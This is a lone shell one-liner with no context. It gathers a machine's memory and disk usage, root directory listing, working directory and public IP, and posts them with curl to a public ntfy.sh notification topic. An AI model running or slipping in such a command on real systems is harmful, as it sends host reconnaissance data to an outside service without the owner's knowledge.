curl \
  -d "$(free -h), $(ls / -a), $(df -h), $(pwd), $(curl ipinfo.io/ip)" \
  ntfy.sh/heck
